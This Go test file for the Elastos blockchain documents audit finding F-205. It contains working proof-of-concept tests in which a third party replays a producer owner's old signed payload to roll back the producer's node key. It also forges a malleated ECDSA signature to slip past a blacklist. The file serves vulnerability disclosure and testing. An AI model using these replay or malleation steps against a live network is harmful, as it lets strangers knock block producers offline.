// Copyright (c) 2017-2021 The Elastos DAO
// Use of this source code is governed by an MIT
// license that can be found in the LICENSE file.
//

package transaction

// F-205 EVIDENCE FILE -- "no domain separation in transaction signatures".
//
// These tests are DELIBERATELY written to assert the CURRENT (vulnerable)
// behaviour. They exist to (a) prove the reachable half of F-205 is REAL
// against the production validator and state machine rather than by argument,
// and (b) pin the two candidate consensus fixes that were EMPIRICALLY
// DISPROVEN against 2,260,597 real mainnet blocks, so that nobody ships them
// later. See the NOTE block in updateproducertransaction.go for the full
// verdict, the measurements, and the deferral rationale.
//
// When the coordinated ecosystem fix (domain-separated payload signing
// message) is finally activated, TestF205 assertions marked FLIP-ON-FIX must
// be inverted.

import (
	"bytes"
	"crypto/sha256"
	"math/big"
	"path/filepath"
	"testing"

	"github.com/elastos/Elastos.ELA/blockchain"
	"github.com/elastos/Elastos.ELA/common"
	"github.com/elastos/Elastos.ELA/common/config"
	"github.com/elastos/Elastos.ELA/core"
	"github.com/elastos/Elastos.ELA/core/checkpoint"
	"github.com/elastos/Elastos.ELA/core/contract"
	"github.com/elastos/Elastos.ELA/core/contract/program"
	"github.com/elastos/Elastos.ELA/core/types"
	common2 "github.com/elastos/Elastos.ELA/core/types/common"
	"github.com/elastos/Elastos.ELA/core/types/functions"
	"github.com/elastos/Elastos.ELA/core/types/interfaces"
	"github.com/elastos/Elastos.ELA/core/types/payload"
	crstate "github.com/elastos/Elastos.ELA/cr/state"
	"github.com/elastos/Elastos.ELA/crypto"
	"github.com/elastos/Elastos.ELA/dpos/state"
)

// f205KeyPair returns a fresh (private key, compressed public key, standard
// program code) triple on the chain's P-256 curve.
func f205KeyPair(t require) ([]byte, []byte, []byte) {
	priv, pub, err := crypto.GenerateKeyPair()
	t.NoError(err)
	encoded, err := pub.EncodePoint(true)
	t.NoError(err)
	code, err := contract.CreateStandardRedeemScript(pub)
	t.NoError(err)
	return priv, encoded, code
}

// require is the small slice of testify's assertions these helpers need.
type require interface {
	NoError(err error, msgAndArgs ...interface{}) bool
}

// TestF205StaleProducerCredentialIsReplayable drives the PRODUCTION
// UpdateProducer validator and the PRODUCTION DPoS state machine to prove that
// payload.ProducerInfo.Signature is a context-free bearer credential: it is
// verified over info.SerializeUnsigned() alone, so any third party can lift a
// previously published (payload, signature) pair out of chain history, wrap it
// in a brand new transaction funded and signed by an unrelated key, and roll
// the producer's record back to that stale state without the owner's consent.
//
// Reverting NodePublicKey de-registers the node key the producer is actually
// signing DPoS messages with -> the producer stops being counted -> inactivity.
func (s *txValidatorTestSuite) TestF205StaleProducerCredentialIsReplayable() {
	ownerPriv, ownerKey, ownerCode := f205KeyPair(s)
	_, nodeV0, _ := f205KeyPair(s)
	_, nodeV1, _ := f205KeyPair(s)
	_, nodeV2, _ := f205KeyPair(s)
	_, attackerKey, attackerCode := f205KeyPair(s)

	// ownerSign produces exactly what the reference wallet produces: a
	// signature over the payload alone -- no chain id, no genesis hash, no
	// nonce, no binding to the carrying transaction.
	ownerSign := func(info *payload.ProducerInfo) {
		buf := new(bytes.Buffer)
		s.NoError(info.SerializeUnsigned(buf, payload.ProducerInfoVersion))
		sig, err := crypto.Sign(ownerPriv, buf.Bytes())
		s.NoError(err)
		info.Signature = sig
	}

	newTx := func(txType common2.TxType, info *payload.ProducerInfo,
		inputs []*common2.Input, code []byte) interfaces.Transaction {
		return functions.CreateTransaction(
			0, txType, payload.ProducerInfoVersion, info,
			[]*common2.Attribute{}, inputs, []*common2.Output{}, 0,
			[]*program.Program{{Code: code}},
		)
	}

	registerInfo := &payload.ProducerInfo{
		OwnerKey: ownerKey, NodePublicKey: nodeV0, NickName: "f205-original",
		Url: "https://f205.invalid", Location: 1, NetAddress: "1.1.1.1:20338",
	}
	ownerSign(registerInfo)

	// ---- fresh DPoS state, same wiring the other validator tests use -------
	s.CurrentHeight = 1
	ckpManager := checkpoint.NewManager(&config.DefaultParams)
	ckpManager.SetDataPath(filepath.Join(config.DefaultParams.DataDir, "checkpoints"))
	s.Chain.SetCRCommittee(crstate.NewCommittee(s.Chain.GetParams(), ckpManager))
	s.Chain.SetState(state.NewState(s.Chain.GetParams(), nil, nil, nil,
		func() bool { return false },
		func(programHash common.Uint168) (common.Fixed64, error) {
			return common.Fixed64(0), nil
		}, nil, nil, nil, nil, nil, nil))
	s.Chain.GetCRCommittee().RegisterFuncitons(&crstate.CommitteeFuncsConfig{
		GetTxReference:                   s.Chain.UTXOCache.GetTxReference,
		GetUTXO:                          s.Chain.GetDB().GetFFLDB().GetUTXO,
		GetHeight:                        func() uint32 { return s.CurrentHeight },
		CreateCRAppropriationTransaction: s.Chain.CreateCRCAppropriationTransaction,
	})

	apply := func(tx interfaces.Transaction) {
		s.Chain.GetState().ProcessBlock(&types.Block{
			Transactions: []interfaces.Transaction{tx},
			Header:       common2.Header{Height: s.CurrentHeight},
		}, nil, 0)
	}

	apply(newTx(common2.RegisterProducer, registerInfo, []*common2.Input{}, ownerCode))
	s.NotNil(s.Chain.GetState().GetProducer(ownerKey), "producer must be registered")

	// ---- the owner legitimately updates twice ------------------------------
	updateV1 := &payload.ProducerInfo{
		OwnerKey: ownerKey, NodePublicKey: nodeV1, NickName: "f205-v1",
		Url: "https://f205.invalid", Location: 2, NetAddress: "2.2.2.2:20338",
	}
	ownerSign(updateV1)
	s.CurrentHeight++
	apply(newTx(common2.UpdateProducer, updateV1, []*common2.Input{}, ownerCode))

	updateV2 := &payload.ProducerInfo{
		OwnerKey: ownerKey, NodePublicKey: nodeV2, NickName: "f205-v2",
		Url: "https://f205.invalid", Location: 3, NetAddress: "3.3.3.3:20338",
	}
	ownerSign(updateV2)
	s.CurrentHeight++
	apply(newTx(common2.UpdateProducer, updateV2, []*common2.Input{}, ownerCode))

	live := s.Chain.GetState().GetProducer(ownerKey)
	s.Require().NotNil(live)
	s.True(bytes.Equal(nodeV2, live.Info().NodePublicKey),
		"precondition: producer must be running node key v2")

	// ---- the ATTACK: replay the v1 credential, funded by a stranger --------
	// Byte-for-byte the payload the owner published at the v1 update, INCLUDING
	// the owner's signature. Anyone can read this off the chain.
	replayed := &payload.ProducerInfo{
		OwnerKey: updateV1.OwnerKey, NodePublicKey: updateV1.NodePublicKey,
		NickName: updateV1.NickName, Url: updateV1.Url,
		Location: updateV1.Location, NetAddress: updateV1.NetAddress,
		StakeUntil: updateV1.StakeUntil, Signature: updateV1.Signature,
	}
	attackerInput := &common2.Input{
		Previous: common2.OutPoint{TxID: *randomUint256(), Index: 0},
	}
	replayTx := newTx(common2.UpdateProducer, replayed,
		[]*common2.Input{attackerInput}, attackerCode)
	replayTx = CreateTransactionByType(replayTx, s.Chain)

	// (1) the ownership gate accepts it. FLIP-ON-FIX.
	err, _ := replayTx.SpecialContextCheck()
	s.NoError(err, "F-205: the production validator accepts a third-party "+
		"replay of a stale owner credential")

	// (2) nothing at the transaction level binds the owner either: the only
	//     program hash the transaction must satisfy is the ATTACKER's funding
	//     address, so RunPrograms is satisfied by the attacker's own signature.
	attackerContract, cerr := contract.CreateStandardContractByCode(attackerCode)
	s.NoError(cerr)
	attackerHash := attackerContract.ToProgramHash()
	hashes, herr := blockchain.GetTxProgramHashes(replayTx,
		map[*common2.Input]common2.Output{
			attackerInput: {
				AssetID: core.ELAAssetID, Value: common.Fixed64(100000000),
				ProgramHash: *attackerHash, Type: common2.OTNone,
			},
		})
	s.NoError(herr)
	s.Equal(1, len(hashes))
	s.True(hashes[0].IsEqual(*attackerHash),
		"F-205: the transaction is authorised by the attacker's key only; "+
			"the producer owner's key is not required anywhere")
	s.False(bytes.Equal(attackerKey, ownerKey))

	// (3) and the state machine really does roll the producer back. FLIP-ON-FIX.
	s.CurrentHeight++
	apply(replayTx)
	rolledBack := s.Chain.GetState().GetProducer(ownerKey)
	s.Require().NotNil(rolledBack)
	s.True(bytes.Equal(nodeV1, rolledBack.Info().NodePublicKey),
		"F-205 PROVEN: a stranger reverted the producer's node key to a stale "+
			"value using nothing but a signature copied from chain history")
	s.Equal("2.2.2.2:20338", rolledBack.Info().NetAddress)
	s.Equal("f205-v1", rolledBack.Info().NickName)
}

// TestF205SigningMessageCarriesNoNetworkBinding proves the headline claim at
// the serializer level: neither the transaction body nor the producer payload
// mixes any chain identifier into the bytes that get signed, so the identical
// message is valid on every network the code can be configured for.
func TestF205SigningMessageCarriesNoNetworkBinding(t *testing.T) {
	mainNet := config.GetDefaultParams()
	testNet := config.GetDefaultParams().TestNet()
	if mainNet.Magic == testNet.Magic {
		t.Fatalf("test setup broken: both networks share magic %d", mainNet.Magic)
	}

	_, ownerKey, _ := f205KeyPair(tShim{t})
	_, nodeKey, _ := f205KeyPair(tShim{t})
	info := &payload.ProducerInfo{
		OwnerKey: ownerKey, NodePublicKey: nodeKey, NickName: "f205",
		Url: "https://f205.invalid", Location: 1, NetAddress: "1.1.1.1:20338",
	}

	// The payload signing message: no parameter carries chain context at all.
	payloadMsg := new(bytes.Buffer)
	if err := info.SerializeUnsigned(payloadMsg, payload.ProducerInfoVersion); err != nil {
		t.Fatal(err)
	}
	for _, magic := range []uint32{mainNet.Magic, testNet.Magic,
		mainNet.DPoSConfiguration.Magic, testNet.DPoSConfiguration.Magic} {
		var le, be [4]byte
		le[0], le[1], le[2], le[3] = byte(magic), byte(magic>>8), byte(magic>>16), byte(magic>>24)
		be[0], be[1], be[2], be[3] = byte(magic>>24), byte(magic>>16), byte(magic>>8), byte(magic)
		if bytes.Contains(payloadMsg.Bytes(), le[:]) || bytes.Contains(payloadMsg.Bytes(), be[:]) {
			t.Fatalf("unexpected: payload signing message contains magic %d", magic)
		}
	}

	// The transaction signing message (BaseTransaction.SerializeUnsigned) is a
	// pure function of the transaction fields, so the very same bytes are
	// produced no matter which network the node believes it is on.
	build := func() interfaces.Transaction {
		return functions.CreateTransaction(
			common2.TxVersion09, common2.UpdateProducer, payload.ProducerInfoVersion,
			info, []*common2.Attribute{}, []*common2.Input{}, []*common2.Output{}, 0,
			[]*program.Program{})
	}
	a, b := new(bytes.Buffer), new(bytes.Buffer)
	if err := build().SerializeUnsigned(a); err != nil {
		t.Fatal(err)
	}
	if err := build().SerializeUnsigned(b); err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(a.Bytes(), b.Bytes()) {
		t.Fatal("test setup broken: serializer is not deterministic")
	}
	t.Logf("F-205 PROVEN (serializer level): %d-byte tx signing message and "+
		"%d-byte payload signing message carry zero chain identity "+
		"(mainnet magic %d vs testnet magic %d)",
		a.Len(), payloadMsg.Len(), mainNet.Magic, testNet.Magic)
}

// TestF205CredentialBlacklistIsDefeatedByMalleation kills the one candidate fix
// that survived the mainnet false-reject measurements: "remember the
// (message, signature) credentials already applied to a producer and refuse to
// apply one twice". crypto.Verify calls ecdsa.Verify with no low-S
// canonicalisation, so (r, n-s) verifies exactly as well as (r, s) -- an
// attacker malleates the copied credential, its hash changes, and the
// blacklist is walked straight past. (Sibling F-129, same root cause: the
// signature encoding itself is not canonical.)
//
// SCOPE CORRECTION (F-205 adversarial audit): this kills the rule ONLY AS KEYED
// on the full signature. Keying the same blacklist on (message || r) is immune,
// because this very malleation preserves r. Measured over the full mainnet
// history, (message||r) has zero duplicates in every payload-signature family
// (UpdateProducer 961/0, ActivateProducer 902/0, CancelProducer 117/0, UpdateCR
// 37/0), so it retains C's zero false-reject property. Do NOT read this test as
// "no blacklist rule can work" -- see C2 in updateproducertransaction.go.
func TestF205CredentialBlacklistIsDefeatedByMalleation(t *testing.T) {
	priv, pub, err := crypto.GenerateKeyPair()
	if err != nil {
		t.Fatal(err)
	}
	encoded, err := pub.EncodePoint(true)
	if err != nil {
		t.Fatal(err)
	}
	info := &payload.ProducerInfo{
		OwnerKey: encoded, NodePublicKey: encoded, NickName: "f205",
		Url: "https://f205.invalid", Location: 1, NetAddress: "1.1.1.1:20338",
	}
	msg := new(bytes.Buffer)
	if err := info.SerializeUnsigned(msg, payload.ProducerInfoVersion); err != nil {
		t.Fatal(err)
	}

	sig, err := crypto.Sign(priv, msg.Bytes())
	if err != nil {
		t.Fatal(err)
	}
	if err := crypto.Verify(*pub, msg.Bytes(), sig); err != nil {
		t.Fatalf("test setup broken: honest signature does not verify: %v", err)
	}

	// (r, s) -> (r, n-s): still a valid ECDSA signature for the same message.
	r := new(big.Int).SetBytes(sig[:crypto.SignerLength])
	sv := new(big.Int).SetBytes(sig[crypto.SignerLength:])
	negS := new(big.Int).Sub(crypto.DefaultParams.N, sv)
	malleated := make([]byte, crypto.SignatureLength)
	copy(malleated[crypto.SignerLength-len(r.Bytes()):], r.Bytes())
	copy(malleated[crypto.SignatureLength-len(negS.Bytes()):], negS.Bytes())

	if err := crypto.Verify(*pub, msg.Bytes(), malleated); err != nil {
		t.Fatalf("malleated signature rejected -- a credential blacklist would "+
			"in fact hold: %v", err)
	}
	if bytes.Equal(sig, malleated) {
		t.Fatal("malleation produced the identical signature")
	}
	if sha256.Sum256(sig) == sha256.Sum256(malleated) {
		t.Fatal("impossible: distinct signatures hashed equal")
	}
	t.Log("F-205 PROVEN: a per-producer credential blacklist is bypassable by " +
		"ECDSA S-malleation (crypto.Verify performs no low-S check) -- the last " +
		"candidate fix that had zero measured false rejects is ineffective")
}

// tShim adapts *testing.T to the tiny assertion interface f205KeyPair needs.
type tShim struct{ t *testing.T }

func (s tShim) NoError(err error, _ ...interface{}) bool {
	if err != nil {
		s.t.Fatal(err)
	}
	return err == nil
}
